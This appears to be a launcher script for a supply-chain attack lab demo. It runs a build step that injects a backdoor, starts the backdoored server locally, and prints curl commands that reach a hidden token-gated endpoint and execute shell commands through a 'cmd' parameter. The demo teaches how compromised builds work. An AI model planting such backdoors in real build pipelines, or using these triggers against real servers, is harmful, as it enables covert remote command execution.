#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

echo ""
echo " COMPROMISED BUILD — Runner injects backdoor"
echo ""

# Run the compromised build script
bash "$SCRIPT_DIR/compromised_runner/build_and_inject.sh"

echo ""
echo "Starting backdoored server on http://localhost:8081"
echo ""
echo "  Open http://localhost:8081 in your browser"
echo "  (looks identical to the clean version!)"
echo ""
echo "  TRIGGER THE BACKDOOR:"
echo "  curl -H 'X-Backdoor-Token: secret' \\"
echo "    http://localhost:8081/__backdoor__"
echo ""
echo "  EXECUTE COMMANDS:"
echo "  curl -H 'X-Backdoor-Token: secret' \\"
echo "    'http://localhost:8081/__backdoor__?cmd=hostname'"
echo ""

export PORT=8081
export LAB_ALLOW_RCE=1   # opt in to live RCE for this controlled, loopback-only demo
exec "$SCRIPT_DIR/build_compromised/server"
